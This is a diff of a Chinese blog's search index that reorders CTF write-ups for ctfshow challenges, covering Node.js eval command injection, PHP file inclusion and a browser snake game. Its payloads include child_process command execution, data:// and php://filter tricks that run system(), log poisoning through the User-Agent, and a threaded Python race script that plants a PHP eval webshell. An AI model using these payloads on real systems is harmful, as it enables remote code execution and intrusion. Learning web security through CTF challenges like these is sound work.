-<p>传入eval&#x3D;1，出现回显，推测为console.log(传参)，反正能执行我的命令并且输出</p>
-<p>在nodejs中执行系统命令我们主要是使用child_process类</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240304175348635.png"  alt="image-20240304175348635"></p>
-<p>可以看到这里有很多方法，有同步和异步创建进程的分类，我们这里需要的是异步创建进程，这里还不是很理解为什么同步创建进程不会有回显(大概是因为主程序没结束，子进程没有执行？)</p>
-<p>先看<code>execSync()</code></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240304180214603.png"  alt="image-20240304180214603"></p>
-<p>官方文档看得不是很懂，希望以后有机会研读</p>
-<p>总之应对这题，只需要一个参数command足以</p>
-<p>payload:eval&#x3D;require(‘child_process’).execSync(‘ls’)</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240304180415820.png"  alt="image-20240304180415820"></p>
-<p>发现flag文件，改命令查看即可</p>
-<h1 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h1><p>这题相比上题，ban掉了exec，所以我们用另一个spawn</p>
-<h2 id="第一种方法spwanSync"><a href="#第一种方法spwanSync" class="headerlink" title="第一种方法spwanSync()"></a>第一种方法spwanSync()</h2><p>payload1:<code>eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString()</code></p>
-<p>payload2:<code>eval=require(&#39;child_process&#39;).spawnSync(&#39;tac&#39;,[&#39;fl001g.txt&#39;]).stdout.toString()</code></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240305181344645.png"  alt="image-20240305181344645"></p>
-<p>学习一下<code>spawnSync()</code>方法</p>
-<p><code>spawnSync()</code>会同步创建一个子进程执行我们传入的命令，并且返回一个对象.</p>
-<h3 id="传入命令"><a href="#传入命令" class="headerlink" title="传入命令"></a>传入命令</h3><p>第一个参数是命令的名称</p>
-<p>第二个参数是一个数组，用来传递命令的参数</p>
-<h3 id="返回的对象"><a href="#返回的对象" class="headerlink" title="返回的对象"></a>返回的对象</h3><p>返回的这个对象包含命令执行后的信息</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240305182634001.png"  alt="image-20240305182634001"></p>
-<p>这里我们需要的是标准输出流stdout，并用toString()将它转化为字符串即可输出</p>
-<h2 id="第二种方法-fs类"><a href="#第二种方法-fs类" class="headerlink" title="第二种方法 fs类"></a>第二种方法 fs类</h2><h3 id="两个魔术变量"><a href="#两个魔术变量" class="headerlink" title="两个魔术变量"></a>两个魔术变量</h3><p>__filename:返回当前模块文件被解析过后的绝对路径</p>
-<p>__dirname:返回当前模块文件解析后所在的文件夹的绝对路径</p>
-<h3 id="readdirSync和readFileSync"><a href="#readdirSync和readFileSync" class="headerlink" title="readdirSync和readFileSync"></a>readdirSync和readFileSync</h3><p>payload1:<code>eval=require(&#39;fs&#39;).readdirSync(&#39;.&#39;)</code>查看当前目录下的文件</p>
-<p>payload2:<code>eval=require(&#39;fs&#39;).readFileSync(&#39;fl001g.txt&#39;,&#39;utf-8&#39;)</code>查看文件</p>
-<h3 id="exec绕过"><a href="#exec绕过" class="headerlink" title="exec绕过"></a>exec绕过</h3><p>payload:?<code>eval=require(&#39;child_process&#39;)[&#39;exe&#39;+&#39;cSync&#39;](&#39;ls&#39;).toString()</code></p>
-<p>这里有个疑点，如果我想读取上一层目录的文件该如何处理,以后再想吧</p>
-<h1 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240305201256890.png"  alt="image-20240305201256890"></p>
-<p>要求，传入两个数ab</p>
-<p>1.a的长度和b的长度一致</p>
-<p>2.a不等于b</p>
-<p>3.md5编码后的a+flag和b+flag相等</p>
-<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>这里我们的payload为a[]&#x3D;1&amp;b[]&#x3D;1</p>
-<p>1.数组.length即数组元素个数，满足相等</p>
-<p>2.JavaScript会比较等号两边数组的地址，弱不一样直接返回false(但是php不会)</p>
-<p>3.上本地测试图</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202533805.png"  alt="image-20240305202533805"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202543607.png"  alt="image-20240305202543607"></p>
-<p>ok了</p>
-<p>再看看如果数组里面有两个元素呢</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202622579.png"  alt="image-20240305202622579"></p>
-<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>payload:a[‘x’]&#x3D;1&amp;b[‘x’]&#x3D;1</p>
-<p>原理与上差不多相同，不过输出的东西不太同</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240305203029034.png"  alt="image-20240305203029034"></p>
-<h1 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h1><p>原型链污染</p>
-<p>移步下一篇文章</p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>入门</tag>
-        <tag>学习</tag>
-        <tag>ctfshow</tag>
-        <tag>js</tag>
       </tags>
   </entry>
   <entry>
@@ -927,97 +850,6 @@
       </tags>
   </entry>
   <entry>
-    <title>文件包含漏洞</title>
-    <url>/2024/03/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>开</p>
-<span id="more"></span>
-
-<h1 id="web-79"><a href="#web-79" class="headerlink" title="web 79"></a>web 79</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313101524315.png"  alt="image-20240313101524315"></p>
-<p><code>file=data://plain/text,&lt;?= &#39;tac flag.php&#39;?&gt;</code><?echo 1?>等于<?= 1?>,需要打开short_open_tag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; &lt;?php system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure>
-
-<h1 id="web-80"><a href="#web-80" class="headerlink" title="web 80"></a>web 80</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313111931278.png"  alt="image-20240313111931278"></p>
-<p>新姿势，包含目录文件</p>
-<p>目录文件会记录我们的ua，浏览器的一些信息，那我们在ua插入php代码，再让include包含并执行，就可以getshell，先包含</p>
-<p>Nginx:&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
-<p>Apache:&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p>
-<p>或许还可以试试有没有error.log</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111318671.png"  alt="image-20240313111318671"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111708459.png"  alt="image-20240313111708459"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111721356.png"  alt="image-20240313111721356"></p>
-<p>得吃</p>
-<p>当然你也可以让file包含你服务器的木马文件，然后直接上线它的服务器也可以</p>
-<h1 id="web-81"><a href="#web-81" class="headerlink" title="web 81"></a>web 81</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313111952192.png"  alt="image-20240313111952192"></p>
-<p>多过滤了一个:</p>
-<p>和上题一样，不能请求自己服务器的木马而已</p>
-<h1 id="web-82-86"><a href="#web-82-86" class="headerlink" title="web 82-86"></a>web 82-86</h1><p><a href="https://blog.csdn.net/qq_46918279/article/details/120106832">CTFSHOW-文件包含_highlight_file(<strong>file</strong>);-CSDN博客</a></p>
-<p>进行一个新知识的学</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line">url=<span class="string">&#x27;http://08d4a04e-19b3-4049-8a81-e9c6226eee2f.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"><span class="comment">#设置PHPSESSID的值</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span>     </span><br><span class="line">data=&#123;<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/tao.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#为了进行条件竞争，需要一边写一边读</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#进行上传文件时需要post传递名为PHP_SESSION_UPLOAD_PROGRESS值为一句话木马</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">	fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)          <span class="comment">#生产一个50k的文件</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url,</span><br><span class="line">			data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">			cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid&#125;,</span><br><span class="line">			files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)&#125;    <span class="comment">#设置文件名字和内容</span></span><br><span class="line">			)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#读取session文件，这里文件为/tmp/sess_ctfshow</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data)</span><br><span class="line">		response2=session.get(url+<span class="string">&#x27;tao.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span> response2.status_code==<span class="number">200</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;++++++++++++++++++++&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(response2.status_code)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">	<span class="comment">#开启多线程进行竞争	</span></span><br><span class="line">	evnet=threading.Event()</span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:			</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">	evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="web-87"><a href="#web-87" class="headerlink" title="web 87"></a>web 87</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240316125758740.png"  alt="image-20240316125758740"></p>
-<p>这题目的是写入木马，并成功执行木马</p>
-<p>分析一波:</p>
-<p>这里的文件名中不能有php，data，：，.</p>
-<p>并且木马写上去后还会先执行死亡程序，不会执行木马</p>
-<p>该怎么做</p>
-<p>先要了解一下<code>php://filter/write=convert.base64-decode/resouce=flag.php</code></p>
-<p>这里是打开一个中间流，如果我们在文件名那里写上这个的话，那么<code>file_put_contents()</code>会这样做，把第二个参数的值以base64解码，并且写到flag.php文件中，接下来就介绍如何突破限制</p>
-<h2 id="文件名"><a href="#文件名" class="headerlink" title="文件名"></a>文件名</h2><p>既然我们要写上上面的payload，那么该如何绕过，可以看到下面还有一层url解码，所以这里可以双重url编码绕过，自己用python写了个脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">payload = <span class="built_in">input</span>(<span class="string">&quot;your payload:[+]&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">twencode</span>(<span class="params">payload</span>):</span><br><span class="line">    res=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    chars = <span class="built_in">list</span>(payload)</span><br><span class="line">    length = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        asc = <span class="built_in">ord</span>(char)</span><br><span class="line">        x0 = <span class="built_in">hex</span>(asc)</span><br><span class="line">        t = x0.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        res += <span class="string">&#x27;%25&#x27;</span>+t</span><br><span class="line">        <span class="comment">#print(res)</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>+twencode(payload))</span><br><span class="line"><span class="comment">#check it</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[-]&quot;</span>+(urllib.parse.unquote((urllib.parse.unquote(twencode(payload))))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240316222716829.png"  alt="image-20240316222716829"></p>
-<h2 id="绕过死亡"><a href="#绕过死亡" class="headerlink" title="绕过死亡"></a>绕过死亡</h2><p>前面提到会以base64解码的形式写入，介绍一下base64解码的过程</p>
-<p>1.筛选字符，把不属于65个base64字符去掉</p>
-<p>2.解码，每四个base64字符为一组解码</p>
-<p>我们这样来操作一下<?php die('大佬别秀了');?></p>
-<p>第一步剩下phpdie</p>
-<p>第二步，由于只有6个字符，解码失败，所以我们要手动添加两个字符，给它乱解即可，反正最后执行我们的php代码即可</p>
-<p>所以payload:<code>content=aaPD9waHAgc3lzdGVtKCdscycpOzs/Pg==</code>aa是自己加的，后面的是<?php system('ls');?></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240316180606776.png"  alt="image-20240316180606776"></p>
-<p>最后再切换命令查看flag即可</p>
-<h1 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240316194352222.png"  alt="image-20240316194352222"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240316194408379.png"  alt="image-20240316194408379"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>学习</tag>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记录一题好玩的游戏题</title>
-    <url>/2024/05/09/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%A2%98%E5%A5%BD%E7%8E%A9%E7%9A%84%E6%B8%B8%E6%88%8F%E9%A2%98/</url>
-    <content><![CDATA[<h1 id="我给五星"><a href="#我给五星" class="headerlink" title="我给五星"></a>我给五星</h1><span id="more"></span>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240509210350791.png"  alt="image-20240509210350791"></p>
-<p>需要我们控制小蛇生存60s，玩玩看</p>
-<p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509205907%20(1).gif"  alt="QQ录屏20240509205907 (1)"></p>
-<p>玩个蛋，给他60s估计都能飞上月球了</p>
-<p>我们打开控制台看源码</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240509210928331.png"  alt="image-20240509210928331"></p>
-<h1 id="高效解法"><a href="#高效解法" class="headerlink" title="高效解法"></a>高效解法</h1><p>可以看到一切都是从new一个snake开始的，注意到timeCounter计时器，于是我们在控制台new一个新的snake再修改计时器时间即可</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240509211124591.png"  alt="image-20240509211124591"></p>
-<p>成功出现flag</p>
-<h1 id="搞笑解法"><a href="#搞笑解法" class="headerlink" title="搞笑解法"></a>搞笑解法</h1><h2 id="修改地图大小"><a href="#修改地图大小" class="headerlink" title="修改地图大小"></a>修改地图大小</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240509211716297.png"  alt="image-20240509211716297"></p>
-<p>看看效果</p>
-<p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509211757.gif"  alt="QQ录屏20240509211757"></p>
-<p>可以看到撞墙了没有死，说明地图确实大了，然后咱们等他跑个60s就好</p>
-<h2 id="改变小蛇速度"><a href="#改变小蛇速度" class="headerlink" title="改变小蛇速度"></a>改变小蛇速度</h2><p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509213044.gif"  alt="QQ录屏20240509213044"></p>
-<p>因为小蛇速度会加快，那么我们就设置一个定时任务，每0.5秒重新设置一次速度就好了</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ewoji = <span class="keyword">new</span> <span class="title class_">Snake</span>(<span class="string">&#x27;ewoji&#x27;</span>,<span class="number">1.5</span>,<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">  ewoji.<span class="property">speed</span> = <span class="number">1.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> intervalID = <span class="built_in">setInterval</span>(myFunction, <span class="number">500</span>);</span><br></pre></td></tr></table></figure>
-
-<p>或者干脆直接把speed设置为0，这样小蛇就会像bot一样在原地不动了</p>
-<p>嘻嘻</p>
-]]></content>
-      <tags>
-        <tag>-ctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>使用kali-linux和docker搭建漏洞复现平台日记</title>
     <url>/2024/03/11/%E4%BD%BF%E7%94%A8kali-linux%E5%92%8Cdocker%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%B9%B3%E5%8F%B0%E6%97%A5%E8%AE%B0/</url>
     <content><![CDATA[<h3 id="其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧"><a href="#其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧" class="headerlink" title="其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧"></a>其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧</h3><span id="more"></span>
@@ -1083,6 +915,174 @@
       <tags>
         <tag>工具</tag>
         <tag>复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>nodejs-ctfshow</title>
+    <url>/2024/03/02/nodejs-ctfshow/</url>
+    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
+
+<h1 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h1><p>给了两个源码文件和一个登录界面</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240303111933863.png"  alt="image-20240303111933863"></p>
+<p>前端可以看到的，以post数据提交用户名和密码，以json格式接受返回数据</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240303112015481.png"  alt="image-20240303112015481"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240303112028812.png"  alt="image-20240303112028812"></p>
+<p>这里给了用户名和密码，然后看了一下登录检验</p>
+<p>用户名不能为CTFSHOW，输入的用户名会经过<code>toUpperCase()</code>转化为大写后与数据比较，密码正常比较。</p>
+<p>既然会转化为大写，直接输入ctfshow(小写)即可</p>
+<h1 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h1><p>题面</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124252606.png"  alt="image-20240303124252606"></p>
+<p>信息收集</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124304897.png"  alt="image-20240303124304897"></p>
+<p>抓包扫描后无果</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124335586.png"  alt="image-20240303124335586"></p>
+<p>传入eval&#x3D;1，出现回显，推测为console.log(传参)，反正能执行我的命令并且输出</p>
+<p>在nodejs中执行系统命令我们主要是使用child_process类</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240304175348635.png"  alt="image-20240304175348635"></p>
+<p>可以看到这里有很多方法，有同步和异步创建进程的分类，我们这里需要的是异步创建进程，这里还不是很理解为什么同步创建进程不会有回显(大概是因为主程序没结束，子进程没有执行？)</p>
+<p>先看<code>execSync()</code></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240304180214603.png"  alt="image-20240304180214603"></p>
+<p>官方文档看得不是很懂，希望以后有机会研读</p>
+<p>总之应对这题，只需要一个参数command足以</p>
+<p>payload:eval&#x3D;require(‘child_process’).execSync(‘ls’)</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240304180415820.png"  alt="image-20240304180415820"></p>
+<p>发现flag文件，改命令查看即可</p>
+<h1 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h1><p>这题相比上题，ban掉了exec，所以我们用另一个spawn</p>
+<h2 id="第一种方法spwanSync"><a href="#第一种方法spwanSync" class="headerlink" title="第一种方法spwanSync()"></a>第一种方法spwanSync()</h2><p>payload1:<code>eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString()</code></p>
+<p>payload2:<code>eval=require(&#39;child_process&#39;).spawnSync(&#39;tac&#39;,[&#39;fl001g.txt&#39;]).stdout.toString()</code></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240305181344645.png"  alt="image-20240305181344645"></p>
+<p>学习一下<code>spawnSync()</code>方法</p>
+<p><code>spawnSync()</code>会同步创建一个子进程执行我们传入的命令，并且返回一个对象.</p>
+<h3 id="传入命令"><a href="#传入命令" class="headerlink" title="传入命令"></a>传入命令</h3><p>第一个参数是命令的名称</p>
+<p>第二个参数是一个数组，用来传递命令的参数</p>
+<h3 id="返回的对象"><a href="#返回的对象" class="headerlink" title="返回的对象"></a>返回的对象</h3><p>返回的这个对象包含命令执行后的信息</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240305182634001.png"  alt="image-20240305182634001"></p>
+<p>这里我们需要的是标准输出流stdout，并用toString()将它转化为字符串即可输出</p>
+<h2 id="第二种方法-fs类"><a href="#第二种方法-fs类" class="headerlink" title="第二种方法 fs类"></a>第二种方法 fs类</h2><h3 id="两个魔术变量"><a href="#两个魔术变量" class="headerlink" title="两个魔术变量"></a>两个魔术变量</h3><p>__filename:返回当前模块文件被解析过后的绝对路径</p>
+<p>__dirname:返回当前模块文件解析后所在的文件夹的绝对路径</p>
+<h3 id="readdirSync和readFileSync"><a href="#readdirSync和readFileSync" class="headerlink" title="readdirSync和readFileSync"></a>readdirSync和readFileSync</h3><p>payload1:<code>eval=require(&#39;fs&#39;).readdirSync(&#39;.&#39;)</code>查看当前目录下的文件</p>
+<p>payload2:<code>eval=require(&#39;fs&#39;).readFileSync(&#39;fl001g.txt&#39;,&#39;utf-8&#39;)</code>查看文件</p>
+<h3 id="exec绕过"><a href="#exec绕过" class="headerlink" title="exec绕过"></a>exec绕过</h3><p>payload:?<code>eval=require(&#39;child_process&#39;)[&#39;exe&#39;+&#39;cSync&#39;](&#39;ls&#39;).toString()</code></p>
+<p>这里有个疑点，如果我想读取上一层目录的文件该如何处理,以后再想吧</p>
+<h1 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240305201256890.png"  alt="image-20240305201256890"></p>
+<p>要求，传入两个数ab</p>
+<p>1.a的长度和b的长度一致</p>
+<p>2.a不等于b</p>
+<p>3.md5编码后的a+flag和b+flag相等</p>
+<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>这里我们的payload为a[]&#x3D;1&amp;b[]&#x3D;1</p>
+<p>1.数组.length即数组元素个数，满足相等</p>
+<p>2.JavaScript会比较等号两边数组的地址，弱不一样直接返回false(但是php不会)</p>
+<p>3.上本地测试图</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202533805.png"  alt="image-20240305202533805"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202543607.png"  alt="image-20240305202543607"></p>
+<p>ok了</p>
+<p>再看看如果数组里面有两个元素呢</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202622579.png"  alt="image-20240305202622579"></p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>payload:a[‘x’]&#x3D;1&amp;b[‘x’]&#x3D;1</p>
+<p>原理与上差不多相同，不过输出的东西不太同</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240305203029034.png"  alt="image-20240305203029034"></p>
+<h1 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h1><p>原型链污染</p>
+<p>移步下一篇文章</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>入门</tag>
+        <tag>学习</tag>
+        <tag>ctfshow</tag>
+        <tag>js</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记录一题好玩的游戏题</title>
+    <url>/2024/05/09/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%A2%98%E5%A5%BD%E7%8E%A9%E7%9A%84%E6%B8%B8%E6%88%8F%E9%A2%98/</url>
+    <content><![CDATA[<h1 id="我给五星"><a href="#我给五星" class="headerlink" title="我给五星"></a>我给五星</h1><span id="more"></span>
+
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240509210350791.png"  alt="image-20240509210350791"></p>
+<p>需要我们控制小蛇生存60s，玩玩看</p>
+<p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509205907%20(1).gif"  alt="QQ录屏20240509205907 (1)"></p>
+<p>玩个蛋，给他60s估计都能飞上月球了</p>
+<p>我们打开控制台看源码</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240509210928331.png"  alt="image-20240509210928331"></p>
+<h1 id="高效解法"><a href="#高效解法" class="headerlink" title="高效解法"></a>高效解法</h1><p>可以看到一切都是从new一个snake开始的，注意到timeCounter计时器，于是我们在控制台new一个新的snake再修改计时器时间即可</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240509211124591.png"  alt="image-20240509211124591"></p>
+<p>成功出现flag</p>
+<h1 id="搞笑解法"><a href="#搞笑解法" class="headerlink" title="搞笑解法"></a>搞笑解法</h1><h2 id="修改地图大小"><a href="#修改地图大小" class="headerlink" title="修改地图大小"></a>修改地图大小</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240509211716297.png"  alt="image-20240509211716297"></p>
+<p>看看效果</p>
+<p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509211757.gif"  alt="QQ录屏20240509211757"></p>
+<p>可以看到撞墙了没有死，说明地图确实大了，然后咱们等他跑个60s就好</p>
+<h2 id="改变小蛇速度"><a href="#改变小蛇速度" class="headerlink" title="改变小蛇速度"></a>改变小蛇速度</h2><p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509213044.gif"  alt="QQ录屏20240509213044"></p>
+<p>因为小蛇速度会加快，那么我们就设置一个定时任务，每0.5秒重新设置一次速度就好了</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ewoji = <span class="keyword">new</span> <span class="title class_">Snake</span>(<span class="string">&#x27;ewoji&#x27;</span>,<span class="number">1.5</span>,<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">  ewoji.<span class="property">speed</span> = <span class="number">1.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> intervalID = <span class="built_in">setInterval</span>(myFunction, <span class="number">500</span>);</span><br></pre></td></tr></table></figure>
+
+<p>或者干脆直接把speed设置为0，这样小蛇就会像bot一样在原地不动了</p>
+<p>嘻嘻</p>
+]]></content>
+      <tags>
+        <tag>-ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含漏洞</title>
+    <url>/2024/03/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>开</p>
+<span id="more"></span>
+
+<h1 id="web-79"><a href="#web-79" class="headerlink" title="web 79"></a>web 79</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313101524315.png"  alt="image-20240313101524315"></p>
+<p><code>file=data://plain/text,&lt;?= &#39;tac flag.php&#39;?&gt;</code><?echo 1?>等于<?= 1?>,需要打开short_open_tag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; &lt;?php system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h1 id="web-80"><a href="#web-80" class="headerlink" title="web 80"></a>web 80</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313111931278.png"  alt="image-20240313111931278"></p>
+<p>新姿势，包含目录文件</p>
+<p>目录文件会记录我们的ua，浏览器的一些信息，那我们在ua插入php代码，再让include包含并执行，就可以getshell，先包含</p>
+<p>Nginx:&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
